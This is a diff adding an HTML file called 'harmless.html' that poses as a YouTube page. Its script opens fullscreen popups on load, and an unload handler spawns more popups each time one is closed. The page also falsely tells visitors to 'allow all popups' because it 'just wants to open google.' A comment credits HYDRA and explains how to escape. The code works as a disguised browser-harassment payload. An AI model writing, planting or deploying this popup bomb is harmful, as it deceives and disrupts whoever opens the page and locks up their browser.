@@ -1,0 +1,59 @@
+
+<html>
+<head>
+<link rel='icon' href='https://www.google.com/s2/favicons?domain=youtube.com' type='image/x-icon'/ >
+<script>
+    var google = window.open('https://www.google.com');//hide our tab
+    var count = 1;//open one popup initially
+    var win = [];//array of windows
+    win[0] = window.open('about:blank', '_blank', 'fullscreen = yes');//open the first window
+    win[0].document.body.innerHTML = '<html><title>rip in advance...</title><h1>hello there! <b>I will warn you: do NOT close this window!</b></h1><style>* {font-family: Arial}</style></html>';//set the special content of the first window
+    win[0].onunload = function() {//make it spam when closed
+          spam();
+    }
+
+    function spam() {//spam more windows!!!
+        count = count+1;//add 2 more windows
+          for (i = 0; i < count; i++) {//window creation loop
+              win[i] = window.open('about:blank', '_blank', 'fullscreen=yes');//create window
+              win[i].document.body.innerHTML = '<html><title>uh oh you oofed up</title><h1>hello there! <b>you did not heed my warning. now you shall pay!</b></h1><style>* {font-family: Arial}</style></html>';//set it's contents
+              win[i].onunload = function() {//spam on close
+                     spam();
+              }
+          }
+    }
+</script>
+<script type="text">
+//
+//INFORMATION
+//
+//harmless.html
+//Version 2.0.5
+//By Droc101
+//12/11/19
+//
+//Based off of
+//Windows 93 / HYDRA
+//
+//How to get rid of it:
+//close the fake 'youtube' tab
+//close all of the popup windows
+//
+//
+//have fun ;)
+//
+//
+//
+</script>
+</head>
+<body>
+<title>YouTube</title>
+<h1>Please allow all popups and reload the page.</h1>
+<h3>I mean, hey, I just want to open google.</h2>
+<style>
+* {
+font-family: "Arial";
+}
+</style>
+</body>
+</html>
